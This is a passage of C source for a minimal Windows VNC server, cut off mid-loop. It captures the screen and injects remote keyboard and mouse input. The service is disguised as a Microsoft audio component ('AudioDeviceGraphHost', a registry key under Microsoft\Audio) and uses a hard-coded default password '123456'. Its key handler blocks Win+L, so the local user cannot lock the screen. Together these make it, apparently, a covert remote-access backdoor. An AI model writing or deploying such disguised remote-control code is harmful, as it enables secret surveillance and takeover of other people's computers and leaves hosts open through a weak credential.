/*
 * vnc_server.c — minimal Win32 RFB 3.8 server, single-file, no 3rd-party deps.
 *
 * v2 (perf + diag):
 *   - TCP_NODELAY on accepted socket
 *   - drain ALL pending input messages before sending an FB update (was
 *     processing one per loop → huge input lag while writing 9 MB frames)
 *   - dirty-rect tiling: 32×32 tile hashes, only changed tiles are sent as
 *     Raw rects → typical static desktop goes from 9 MB/frame to a few KB
 *   - 16 ms dirty-probe, 33 ms min between send (30 fps ceiling)
 *   - session stats + per-msg trace → C:\nv\vnc.log (helpful when diagnosing
 *     which client speaks which subset of RFB)
 */

#define _WIN32_WINNT 0x0600
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* ──────────────────────── identity (all editable) ─────────────────── */
#define SERVICE_NAME    "AudioDeviceGraphHost"
#define SERVICE_DISPLAY "Audio Device Graph Host"
#define SERVICE_DESC    "Manages audio device graph isolation for WDM audio streams."
#define REG_ROOT_HKLM   "SOFTWARE\\Microsoft\\Audio\\GraphHost"
#define DEFAULT_PORT    56789
#define DEFAULT_PASSWORD "123456"
#define SERVER_BANNER   "AudioHost Desktop"
#define LOG_PATH        "C:\\nv\\vnc.log"
#define TILE_SIZE       32

/* ──────────────────────── RFB protocol constants ──────────────────── */
#define RFB_VERSION         "RFB 003.008\n"
#define SECTYPE_VNCAUTH     2
#define MSG_SETPIXELFORMAT  0
#define MSG_SETENCODINGS    2
#define MSG_FBUPDATE_REQ    3
#define MSG_KEYEVENT        4
#define MSG_POINTEREVENT    5
#define MSG_CUTTEXT         6

/* ──────────────────────── globals ─────────────────────────────────── */
static SERVICE_STATUS        g_svc_status;
static SERVICE_STATUS_HANDLE g_svc_handle;
static volatile LONG         g_stop_requested = 0;

/* ──────────────────────── logging ─────────────────────────────────── */
static CRITICAL_SECTION g_log_cs;
static int g_log_inited = 0;

static void log_init(void) {
    if (g_log_inited) return;
    InitializeCriticalSection(&g_log_cs);
    g_log_inited = 1;
    CreateDirectoryA("C:\\nv", NULL);
}
static void vlog(const char *fmt, ...) {
    if (!g_log_inited) return;
    EnterCriticalSection(&g_log_cs);
    FILE *f = fopen(LOG_PATH, "a");
    if (f) {
        SYSTEMTIME t; GetLocalTime(&t);
        fprintf(f, "%02d:%02d:%02d.%03d ", t.wHour, t.wMinute, t.wSecond, t.wMilliseconds);
        va_list ap; va_start(ap, fmt);
        vfprintf(f, fmt, ap);
        va_end(ap);
        fputc('\n', f);
        fclose(f);
    }
    LeaveCriticalSection(&g_log_cs);
}

/* ──────────────────────── DES (for VncAuth) ───────────────────────── */
static const uint8_t DES_S[8][64] = {
    {14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,
     4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13},
    {15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,
     0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9},
    {10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,
     13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12},
    {7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,
     10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14},
    {2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,
     4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3},
    {12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,
     9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13},
    {4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,
     1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12},
    {13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,
     7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11}
};
static const uint8_t DES_P[32] = {
    16,7,20,21,29,12,28,17, 1,15,23,26, 5,18,31,10,
     2, 8,24,14,32,27, 3, 9,19,13,30, 6,22,11, 4,25
};
static const uint8_t DES_IP[64] = {
    58,50,42,34,26,18,10, 2,60,52,44,36,28,20,12, 4,
    62,54,46,38,30,22,14, 6,64,56,48,40,32,24,16, 8,
    57,49,41,33,25,17, 9, 1,59,51,43,35,27,19,11, 3,
    61,53,45,37,29,21,13, 5,63,55,47,39,31,23,15, 7
};
static const uint8_t DES_FP[64] = {
    40, 8,48,16,56,24,64,32,39, 7,47,15,55,23,63,31,
    38, 6,46,14,54,22,62,30,37, 5,45,13,53,21,61,29,
    36, 4,44,12,52,20,60,28,35, 3,43,11,51,19,59,27,
    34, 2,42,10,50,18,58,26,33, 1,41, 9,49,17,57,25
};
static const uint8_t DES_E[48] = {
    32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9,10,11,
    12,13,12,13,14,15,16,17,16,17,18,19,20,21,20,21,
    22,23,24,25,24,25,26,27,28,29,28,29,30,31,32, 1
};
static const uint8_t DES_PC1[56] = {
    57,49,41,33,25,17, 9, 1,58,50,42,34,26,18,10, 2,
    59,51,43,35,27,19,11, 3,60,52,44,36,63,55,47,39,
    31,23,15, 7,62,54,46,38,30,22,14, 6,61,53,45,37,
    29,21,13, 5,28,20,12, 4
};
static const uint8_t DES_PC2[48] = {
    14,17,11,24, 1, 5, 3,28,15, 6,21,10,23,19,12, 4,
    26, 8,16, 7,27,20,13, 2,41,52,31,37,47,55,30,40,
    51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32
};
static const uint8_t DES_ROT[16] = {1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1};

static uint64_t bitperm(uint64_t src, const uint8_t *perm, int n, int src_size) {
    uint64_t r = 0;
    for (int i = 0; i < n; i++) {
        uint64_t bit = (src >> (src_size - perm[i])) & 1;
        r |= bit << (n - 1 - i);
    }
    return r;
}
static void des_crypt(const uint8_t key[8], const uint8_t in[8], uint8_t out[8]) {
    uint64_t k = 0, m = 0;
    for (int i = 0; i < 8; i++) { k = (k<<8)|key[i]; m = (m<<8)|in[i]; }
    uint64_t key56 = bitperm(k, DES_PC1, 56, 64);
    uint32_t c = (key56 >> 28) & 0xFFFFFFF;
    uint32_t d =  key56        & 0xFFFFFFF;
    uint64_t subkeys[16];
    for (int i = 0; i < 16; i++) {
        c = ((c << DES_ROT[i]) | (c >> (28 - DES_ROT[i]))) & 0xFFFFFFF;
        d = ((d << DES_ROT[i]) | (d >> (28 - DES_ROT[i]))) & 0xFFFFFFF;
        uint64_t cd = ((uint64_t)c << 28) | d;
        subkeys[i] = bitperm(cd, DES_PC2, 48, 56);
    }
    uint64_t ip = bitperm(m, DES_IP, 64, 64);
    uint32_t L = (uint32_t)(ip >> 32);
    uint32_t R = (uint32_t)(ip & 0xFFFFFFFF);
    for (int round = 0; round < 16; round++) {
        uint64_t expR = bitperm(R, DES_E, 48, 32);
        uint64_t x = expR ^ subkeys[round];
        uint32_t s_out = 0;
        for (int i = 0; i < 8; i++) {
            uint8_t six = (x >> (42 - 6*i)) & 0x3F;
            uint8_t row = ((six & 0x20) >> 4) | (six & 1);
            uint8_t col = (six >> 1) & 0xF;
            s_out = (s_out << 4) | DES_S[i][row*16 + col];
        }
        uint32_t f = (uint32_t)bitperm(s_out, DES_P, 32, 32);
        uint32_t newL = R;
        R = L ^ f;
        L = newL;
    }
    uint64_t pre = ((uint64_t)R << 32) | L;
    uint64_t fp = bitperm(pre, DES_FP, 64, 64);
    for (int i = 0; i < 8; i++) out[i] = (fp >> (56 - 8*i)) & 0xFF;
}
static void vnc_flip_bits(uint8_t k[8]) {
    for (int i = 0; i < 8; i++) {
        uint8_t v = k[i], r = 0;
        for (int b = 0; b < 8; b++) if (v & (1<<b)) r |= 1 << (7-b);
        k[i] = r;
    }
}

/* ──────────────────────── screen capture + tile hashes ────────────── */
typedef struct {
    int width, height;
    int tiles_x, tiles_y;
    HDC  screen_dc;
    HDC  mem_dc;
    HBITMAP bmp;
    uint8_t *bits;        /* 32bpp BGRX layout, top-down DIB */
    uint32_t *tile_hash;      /* current frame */
    uint32_t *tile_hash_prev; /* last successfully-sent frame */
} Screen;

static int screen_init(Screen *s) {
    s->width  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    s->height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (s->width <= 0 || s->height <= 0) { s->width = 1920; s->height = 1080; }

    s->tiles_x = (s->width  + TILE_SIZE - 1) / TILE_SIZE;
    s->tiles_y = (s->height + TILE_SIZE - 1) / TILE_SIZE;

    s->screen_dc = GetDC(NULL);
    s->mem_dc    = CreateCompatibleDC(s->screen_dc);

    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(bmi.bmiHeader);
    bmi.bmiHeader.biWidth = s->width;
    bmi.bmiHeader.biHeight = -s->height;   /* top-down */
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    s->bmp = CreateDIBSection(s->mem_dc, &bmi, DIB_RGB_COLORS,
                              (void**)&s->bits, NULL, 0);
    if (!s->bmp || !s->bits) return -1;
    SelectObject(s->mem_dc, s->bmp);

    size_t nt = (size_t)s->tiles_x * s->tiles_y;
    s->tile_hash      = (uint32_t*)calloc(nt, 4);
    s->tile_hash_prev = (uint32_t*)malloc(nt * 4);
    /* force first frame "all dirty" */
    memset(s->tile_hash_prev, 0xFF, nt * 4);
    return 0;
}
static void screen_capture(Screen *s) {
    BitBlt(s->mem_dc, 0, 0, s->width, s->height,
           s->screen_dc, 0, 0, SRCCOPY | CAPTUREBLT);
}
static void screen_free(Screen *s) {
    if (s->mem_dc) DeleteDC(s->mem_dc);
    if (s->screen_dc) ReleaseDC(NULL, s->screen_dc);
    if (s->bmp) DeleteObject(s->bmp);
    free(s->tile_hash); free(s->tile_hash_prev);
    memset(s, 0, sizeof(*s));
}

/* Compute FNV-1a-ish 32-bit hash per tile. Reads 32-bit pixel words,
 * fast: one MUL + one XOR per pixel. */
static void compute_tile_hashes(Screen *s) {
    int stride_px = s->width;
    uint32_t *pixels = (uint32_t*)s->bits;
    for (int ty = 0; ty < s->tiles_y; ty++) {
        int y0 = ty * TILE_SIZE;
        int th = (y0 + TILE_SIZE > s->height) ? (s->height - y0) : TILE_SIZE;
        for (int tx = 0; tx < s->tiles_x; tx++) {
            int x0 = tx * TILE_SIZE;
            int tw = (x0 + TILE_SIZE > s->width) ? (s->width - x0) : TILE_SIZE;
            uint32_t h = 0x811c9dc5u;
            for (int y = 0; y < th; y++) {
                const uint32_t *row = pixels + (y0 + y) * stride_px + x0;
                for (int x = 0; x < tw; x++) {
                    h = (h ^ row[x]) * 0x01000193u;
                }
            }
            s->tile_hash[ty * s->tiles_x + tx] = h;
        }
    }
}

/* ──────────────────────── socket helpers ──────────────────────────── */
static int read_exact(SOCKET s, void *p, int n) {
    char *b = p;
    while (n > 0) {
        int r = recv(s, b, n, 0);
        if (r <= 0) return -1;
        b += r; n -= r;
    }
    return 0;
}
static int write_exact(SOCKET s, const void *p, int n) {
    const char *b = p;
    while (n > 0) {
        int r = send(s, b, n, 0);
        if (r <= 0) return -1;
        b += r; n -= r;
    }
    return 0;
}
static int sock_has_data(SOCKET s) {
    fd_set rd; FD_ZERO(&rd); FD_SET(s, &rd);
    struct timeval tv = {0, 0};
    int r = select(0, &rd, NULL, NULL, &tv);
    return r > 0;
}
static void pack_u16(uint8_t *p, uint16_t v) { p[0]=v>>8; p[1]=v; }
static void pack_u32(uint8_t *p, uint32_t v) { p[0]=v>>24; p[1]=v>>16; p[2]=v>>8; p[3]=v; }

/* ──────────────────────── config (registry) ───────────────────────── */
static int reg_get_dword(HKEY root, const char *path, const char *name, uint32_t *out) {
    HKEY h;
    if (RegOpenKeyExA(root, path, 0, KEY_READ, &h) != ERROR_SUCCESS) return -1;
    DWORD type = 0, sz = sizeof(*out);
    LONG rc = RegQueryValueExA(h, name, NULL, &type, (BYTE*)out, &sz);
    RegCloseKey(h);
    return rc == ERROR_SUCCESS ? 0 : -1;
}
static int reg_get_sz(HKEY root, const char *path, const char *name, char *out, int outsz) {
    HKEY h;
    if (RegOpenKeyExA(root, path, 0, KEY_READ, &h) != ERROR_SUCCESS) return -1;
    DWORD type = 0, sz = outsz;
    LONG rc = RegQueryValueExA(h, name, NULL, &type, (BYTE*)out, &sz);
    RegCloseKey(h);
    return rc == ERROR_SUCCESS ? 0 : -1;
}
static int cfg_port(void) {
    uint32_t p = 0;
    if (reg_get_dword(HKEY_LOCAL_MACHINE, REG_ROOT_HKLM, "ListenPort", &p) == 0 && p > 0 && p < 65536)
        return (int)p;
    return DEFAULT_PORT;
}
static void cfg_password(char out[9]) {
    char buf[64] = {0};
    if (reg_get_sz(HKEY_LOCAL_MACHINE, REG_ROOT_HKLM, "Password", buf, sizeof(buf)) == 0 && buf[0])
        strncpy(out, buf, 8);
    else
        strncpy(out, DEFAULT_PASSWORD, 8);
    out[8] = 0;
}

/* ──────────────────────── input handling ──────────────────────────── */
static void inject_pointer(uint8_t mask, int x, int y, Screen *s) {
    static uint8_t last = 0;

    /* Move (absolute coords). Do NOT combine MOVE and button events in a
     * single INPUT record: Windows has subtle "click-at-new-pos" vs
     * "move-then-click" semantics that differ. Send MOVE, then any button
     * deltas as separate SendInput calls. */
    INPUT mv = {0};
    mv.type = INPUT_MOUSE;
    int vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN); if (vw <= 0) vw = s->width;
    int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN); if (vh <= 0) vh = s->height;
    mv.mi.dx = (int)(((LONGLONG)(x - vx) * 65535) / (vw > 0 ? vw : 1));
    mv.mi.dy = (int)(((LONGLONG)(y - vy) * 65535) / (vh > 0 ? vh : 1));
    mv.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_MOVE;
    SendInput(1, &mv, sizeof(mv));

    uint8_t changed = mask ^ last;
    if (changed & 7) {
        INPUT btn = {0};
        btn.type = INPUT_MOUSE;
        btn.mi.dwFlags = 0;
        if (changed & 1) btn.mi.dwFlags |= (mask & 1) ? MOUSEEVENTF_LEFTDOWN   : MOUSEEVENTF_LEFTUP;
        if (changed & 2) btn.mi.dwFlags |= (mask & 2) ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
        if (changed & 4) btn.mi.dwFlags |= (mask & 4) ? MOUSEEVENTF_RIGHTDOWN  : MOUSEEVENTF_RIGHTUP;
        SendInput(1, &btn, sizeof(btn));
    }
    last = mask;

    /* wheel is edge-triggered: bit3 up pulse, bit4 down pulse */
    if (mask & 8)  { INPUT w={0}; w.type=INPUT_MOUSE; w.mi.dwFlags=MOUSEEVENTF_WHEEL; w.mi.mouseData=+120; SendInput(1,&w,sizeof(w)); }
    if (mask & 16) { INPUT w={0}; w.type=INPUT_MOUSE; w.mi.dwFlags=MOUSEEVENTF_WHEEL; w.mi.mouseData=-120; SendInput(1,&w,sizeof(w)); }
}
static void inject_key(uint8_t down, uint32_t keysym) {
    static int win_down = 0;
    static int suppress_win_l_up = 0;
    WORD vk = 0; DWORD flags = down ? 0 : KEYEVENTF_KEYUP;
    int want_shift = 0;
    if (keysym >= 0x20 && keysym <= 0x7E) {
        SHORT sc = VkKeyScanA((char)keysym);
        if (sc == -1) return;
        vk = sc & 0xFF;
        want_shift = (sc & 0x100) ? 1 : 0;
    } else {
        switch (keysym) {
            case 0xFF08: vk = VK_BACK;   break;
            case 0xFF09: vk = VK_TAB;    break;
            case 0xFF0D: vk = VK_RETURN; break;
            case 0xFF1B: vk = VK_ESCAPE; break;
            case 0xFF50: vk = VK_HOME;   break;
            case 0xFF51: vk = VK_LEFT;   break;
            case 0xFF52: vk = VK_UP;     break;
            case 0xFF53: vk = VK_RIGHT;  break;
            case 0xFF54: vk = VK_DOWN;   break;
            case 0xFF55: vk = VK_PRIOR;  break;
            case 0xFF56: vk = VK_NEXT;   break;
            case 0xFF57: vk = VK_END;    break;
            case 0xFF63: vk = VK_INSERT; break;
            case 0xFFFF: vk = VK_DELETE; break;
            case 0xFFBE: vk = VK_F1; break;
            case 0xFFBF: vk = VK_F2; break;
            case 0xFFC0: vk = VK_F3; break;
            case 0xFFC1: vk = VK_F4; break;
            case 0xFFC2: vk = VK_F5; break;
            case 0xFFC3: vk = VK_F6; break;
            case 0xFFC4: vk = VK_F7; break;
            case 0xFFC5: vk = VK_F8; break;
            case 0xFFC6: vk = VK_F9; break;
            case 0xFFC7: vk = VK_F10; break;
            case 0xFFC8: vk = VK_F11; break;
            case 0xFFC9: vk = VK_F12; break;
            case 0xFFE1: case 0xFFE2: vk = VK_SHIFT;   break;
            case 0xFFE3: case 0xFFE4: vk = VK_CONTROL; break;
            case 0xFFE5:              vk = VK_CAPITAL; break;
            case 0xFFE7: case 0xFFEB: vk = VK_LWIN;    break;
            case 0xFFE8: case 0xFFEC: vk = VK_RWIN;    break;
            case 0xFFE9: case 0xFFEA: vk = VK_MENU;    break;
            /* Numeric keypad. NumLock-on / NumLock-off X server emits two
             * different keysym ranges, so we map both: 0xFFB0-0xFFB9 are
             * the "digit" symbols (NumLock on), 0xFF95-0xFF9F are the
             * navigation symbols (NumLock off). On the Windows side the
             * VK_NUMPAD* codes already differentiate from the main row,
             * so apps that care about KP-vs-main row see the right code. */
            case 0xFF7F: vk = VK_NUMLOCK;  break;
            case 0xFF8D: vk = VK_RETURN;   break;  /* KP_Enter */
            case 0xFFAA: vk = VK_MULTIPLY; break;
            case 0xFFAB: vk = VK_ADD;      break;
            case 0xFFAC: vk = VK_SEPARATOR;break;
            case 0xFFAD: vk = VK_SUBTRACT; break;
            case 0xFFAE: vk = VK_DECIMAL;  break;
            case 0xFFAF: vk = VK_DIVIDE;   break;
            case 0xFFB0: vk = VK_NUMPAD0;  break;
            case 0xFFB1: vk = VK_NUMPAD1;  break;
            case 0xFFB2: vk = VK_NUMPAD2;  break;
            case 0xFFB3: vk = VK_NUMPAD3;  break;
            case 0xFFB4: vk = VK_NUMPAD4;  break;
            case 0xFFB5: vk = VK_NUMPAD5;  break;
            case 0xFFB6: vk = VK_NUMPAD6;  break;
            case 0xFFB7: vk = VK_NUMPAD7;  break;
            case 0xFFB8: vk = VK_NUMPAD8;  break;
            case 0xFFB9: vk = VK_NUMPAD9;  break;
            /* KP nav keys (NumLock off) */
            case 0xFF95: vk = VK_HOME;   break;  /* KP_Home  */
            case 0xFF96: vk = VK_LEFT;   break;
            case 0xFF97: vk = VK_UP;     break;
            case 0xFF98: vk = VK_RIGHT;  break;
            case 0xFF99: vk = VK_DOWN;   break;
            case 0xFF9A: vk = VK_PRIOR;  break;  /* KP_PageUp */
            case 0xFF9B: vk = VK_NEXT;   break;  /* KP_PageDown */
            case 0xFF9C: vk = VK_END;    break;
            case 0xFF9E: vk = VK_INSERT; break;
            case 0xFF9F: vk = VK_DELETE; break;
            default: return;
        }
    }
    if (vk == VK_LWIN || vk == VK_RWIN) {
        win_down = down ? 1 : 0;
    }
    if (down && win_down && vk == 'L') {
        INPUT win_up[2] = {0};
        win_up[0].type = INPUT_KEYBOARD;
        win_up[0].ki.wVk = VK_LWIN;
        win_up[0].ki.dwFlags = KEYEVENTF_KEYUP;
        win_up[1].type = INPUT_KEYBOARD;
        win_up[1].ki.wVk = VK_RWIN;
        win_up[1].ki.dwFlags = KEYEVENTF_KEYUP;
        SendInput(2, win_up, sizeof(win_up[0]));
        win_down = 0;
        suppress_win_l_up = 1;
        vlog("  Win+L suppressed: lock screen breaks DDA capture");
        return;
    }
    if (!down && suppress_win_l_up && vk == 'L') {
        suppress_win_l_up = 0;
        return;
    }
    if (want_shift && down) { INPUT sh={0}; sh.type=INPUT_KEYBOARD; sh.ki.wVk=VK_SHIFT; sh.ki.dwFlags=0; SendInput(1,&sh,sizeof(sh)); }
    INPUT in = {0}; in.type = INPUT_KEYBOARD; in.ki.wVk = vk; in.ki.dwFlags = flags;
    SendInput(1, &in, sizeof(in));
    if (want_shift && !down) { INPUT sh={0}; sh.type=INPUT_KEYBOARD; sh.ki.wVk=VK_SHIFT; sh.ki.dwFlags=KEYEVENTF_KEYUP; SendInput(1,&sh,sizeof(sh)); }
}

/* ──────────────────────── one RFB message reader ──────────────────── */
typedef struct {
    int need_update;           /* client asked for FB update */
    int force_full;            /* non-incremental requested */
    int saw_setpixel;
    int msg_trace_count;       /* how many msgs still to trace */
    uint32_t cnt_ptr, cnt_key, cnt_fbreq, cnt_setenc, cnt_setfmt, cnt_cut;
} SessionState;

static int read_one_message(SOCKET s, Screen *scr, SessionState *st) {
    uint8_t type;
    if (read_exact(s, &type, 1) < 0) return -1;

    if (st->msg_trace_count > 0) {
        vlog("  msg type=%u", (unsigned)type);
        st->msg_trace_count--;
    }

    switch (type) {
    case MSG_SETPIXELFORMAT: {
        uint8_t skip[3 + 16];
        if (read_exact(s, skip, sizeof(skip)) < 0) return -1;
        st->cnt_setfmt++;
        st->saw_setpixel = 1;
        break;
    }
    case MSG_SETENCODINGS: {
        uint8_t pad; uint8_t cnt[2];
        if (read_exact(s, &pad, 1) < 0 || read_exact(s, cnt, 2) < 0) return -1;
        uint32_t n = ((uint32_t)cnt[0]<<8) | cnt[1];
        if (n > 256) n = 256;
        uint8_t enc[4];
        for (uint32_t i = 0; i < n; i++) {
            if (read_exact(s, enc, 4) < 0) return -1;
        }
        st->cnt_setenc++;
        break;
    }
    case MSG_FBUPDATE_REQ: {
        uint8_t pad_inc, rect[8];
        if (read_exact(s, &pad_inc, 1) < 0 || read_exact(s, rect, 8) < 0) return -1;
        if (!pad_inc) st->force_full = 1;
        st->need_update = 1;
        st->cnt_fbreq++;
        break;
    }
    case MSG_KEYEVENT: {
        uint8_t pd[3]; uint8_t ks[4];
        if (read_exact(s, pd, 3) < 0 || read_exact(s, ks, 4) < 0) return -1;
        uint32_t keysym = ((uint32_t)ks[0]<<24)|((uint32_t)ks[1]<<16)|((uint32_t)ks[2]<<8)|ks[3];
        inject_key(pd[0], keysym);
        st->cnt_key++;
        if (st->cnt_key <= 5) vlog("  KEY down=%u ks=0x%08x", pd[0], keysym);
        break;
    }
    case MSG_POINTEREVENT: {
        uint8_t mask; uint8_t pos[4];
        if (read_exact(s, &mask, 1) < 0 || read_exact(s, pos, 4) < 0) return -1;
        int x = ((int)pos[0]<<8)|pos[1];
        int y = ((int)pos[2]<<8)|pos[3];
        inject_pointer(mask, x, y, scr);
        st->cnt_ptr++;
        if (st->cnt_ptr <= 5) vlog("  PTR mask=0x%02x at %d,%d", mask, x, y);
        break;
    }
    case MSG_CUTTEXT: {
        uint8_t pad[3]; uint8_t ln[4];
        if (read_exact(s, pad, 3) < 0 || read_exact(s, ln, 4) < 0) return -1;
        uint32_t len = ((uint32_t)ln[0]<<24)|((uint32_t)ln[1]<<16)|((uint32_t)ln[2]<<8)|ln[3];
        char chunk[4096];
        while (len > 0) {
            int c = (int)(len > sizeof(chunk) ? sizeof(chunk) : len);
            if (read_exact(s, chunk, c) < 0) return -1;
            len -= c;
        }
        st->cnt_cut++;
        break;
    }
    default:
        vlog("  UNKNOWN msg type=%u — disconnecting", (unsigned)type);
        return -1;
    }
    return 0;
}

/* Send a FramebufferUpdate consisting of the dirty tiles (Raw encoding).
 * If force_full, sends one big Raw rect for the entire screen. */
static int send_fb_update(SOCKET s, Screen *scr, int force_full) {
    screen_capture(scr);
    compute_tile_hashes(scr);

    int tw_full = scr->width, th_full = scr->height;
    int stride_bytes = scr->width * 4;

    if (force_full) {
        uint8_t hdr[16];
        hdr[0] = 0; hdr[1] = 0;
        pack_u16(hdr + 2, 1);
        pack_u16(hdr + 4, 0);
        pack_u16(hdr + 6, 0);
        pack_u16(hdr + 8, (uint16_t)tw_full);
        pack_u16(hdr + 10,(uint16_t)th_full);
        pack_u32(hdr + 12, 0);
        if (write_exact(s, hdr, 16) < 0) return -1;
        /* contiguous top-down DIB → one big write */
        if (write_exact(s, scr->bits, stride_bytes * th_full) < 0) return -1;
        memcpy(scr->tile_hash_prev, scr->tile_hash,
               (size_t)scr->tiles_x * scr->tiles_y * 4);
        return 0;
    }

    /* count dirty */
    int dirty = 0;
    int total_tiles = scr->tiles_x * scr->tiles_y;
    for (int i = 0; i < total_tiles; i++)
        if (scr->tile_hash[i] != scr->tile_hash_prev[i]) dirty++;

    /* Rect count is u16, so cap at 65535. In practice dirty never comes
     * close; a 1920x1200/32 grid has 2280 tiles. */
    if (dirty > 65535) dirty = 65535;

    uint8_t hdr[4];
    hdr[0] = 0; hdr[1] = 0;
    pack_u16(hdr + 2, (uint16_t)dirty);
    if (write_exact(s, hdr, 4) < 0) return -1;

    if (dirty == 0) return 0;  /* nothing to send, just the empty update */

    int sent_rects = 0;
    for (int ty = 0; ty < scr->tiles_y && sent_rects < dirty; ty++) {
        int y0 = ty * TILE_SIZE;
        int th = (y0 + TILE_SIZE > scr->height) ? (scr->height - y0) : TILE_SIZE;
        for (int tx = 0; tx < scr->tiles_x && sent_rects < dirty; tx++) {
            int idx = ty * scr->tiles_x + tx;
            if (scr->tile_hash[idx] == scr->tile_hash_prev[idx]) continue;

            int x0 = tx * TILE_SIZE;
            int tiw = (x0 + TILE_SIZE > scr->width) ? (scr->width - x0) : TILE_SIZE;

            uint8_t rh[12];
            pack_u16(rh + 0, (uint16_t)x0);
            pack_u16(rh + 2, (uint16_t)y0);
            pack_u16(rh + 4, (uint16_t)tiw);
            pack_u16(rh + 6, (uint16_t)th);
            pack_u32(rh + 8, 0);  /* Raw */
            if (write_exact(s, rh, 12) < 0) return -1;

            for (int yy = 0; yy < th; yy++) {
                if (write_exact(s, scr->bits + (y0+yy)*stride_bytes + x0*4,
                                tiw * 4) < 0) return -1;
            }
            scr->tile_hash_prev[idx] = scr->tile_hash[idx];
            sent_rects++;
        }
    }
    return 0;
}

/* ──────────────────────── one RFB session ─────────────────────────── */
static int rfb_session(SOCKET s, Screen *scr, const char *password) {
    int on = 1;
    setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char*)&on, sizeof(on));
    int sndbuf = 1 << 20;  /* 1 MB send buffer */
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, (const char*)&sndbuf, sizeof(sndbuf));

    vlog("=== session start ===");

    if (write_exact(s, RFB_VERSION, 12) < 0) return -1;
    char cli_ver[12];
    if (read_exact(s, cli_ver, 12) < 0) return -1;
    vlog("  client ver: %.11s", cli_ver);

    uint8_t sec[2] = { 1, SECTYPE_VNCAUTH };
    if (write_exact(s, sec, 2) < 0) return -1;
    uint8_t chosen;
    if (read_exact(s, &chosen, 1) < 0 || chosen != SECTYPE_VNCAUTH) return -1;

    uint8_t challenge[16];
    for (int i = 0; i < 16; i++) challenge[i] = (uint8_t)GetTickCount() ^ i ^ (uint8_t)rand();
    if (write_exact(s, challenge, 16) < 0) return -1;

    uint8_t resp[16];
    if (read_exact(s, resp, 16) < 0) return -1;

    uint8_t key[8] = {0};
    strncpy((char*)key, password, 8);
    vnc_flip_bits(key);
    uint8_t expect[16];
    des_crypt(key, challenge,     expect);
    des_crypt(key, challenge + 8, expect + 8);

    uint8_t ok = (memcmp(expect, resp, 16) == 0) ? 0 : 1;
    uint8_t sec_result[4] = {0, 0, 0, ok};
    if (write_exact(s, sec_result, 4) < 0) return -1;
    if (ok) { vlog("  AUTH FAIL"); return -1; }
    vlog("  auth OK");

    uint8_t shared;
    if (read_exact(s, &shared, 1) < 0) return -1;

    uint8_t srv_init[24];
    pack_u16(srv_init + 0, (uint16_t)scr->width);
    pack_u16(srv_init + 2, (uint16_t)scr->height);
    srv_init[4] = 32; srv_init[5] = 24; srv_init[6] = 0; srv_init[7] = 1;
    pack_u16(srv_init + 8,  255);
    pack_u16(srv_init + 10, 255);
    pack_u16(srv_init + 12, 255);
    srv_init[14] = 16; srv_init[15] = 8; srv_init[16] = 0;
    srv_init[17] = srv_init[18] = srv_init[19] = 0;
    pack_u32(srv_init + 20, (uint32_t)strlen(SERVER_BANNER));
    if (write_exact(s, srv_init, 24) < 0) return -1;
    if (write_exact(s, SERVER_BANNER, (int)strlen(SERVER_BANNER)) < 0) return -1;

    vlog("  ServerInit sent: %dx%d", scr->width, scr->height);

    SessionState st = {0};
    st.msg_trace_count = 30;   /* trace the first 30 msgs of this session */

    DWORD last_send_tick = 0;
    const DWORD min_interval_ms = 33;   /* ≤30 fps */
    const DWORD starve_ms       = 1000; /* still send an empty update this often */

    for (;;) {
        if (g_stop_requested) { vlog("  stop requested"); break; }

        /* Drain ALL pending input before considering a frame send.
         * This is critical: 9 MB Raw frames take a long time to write,
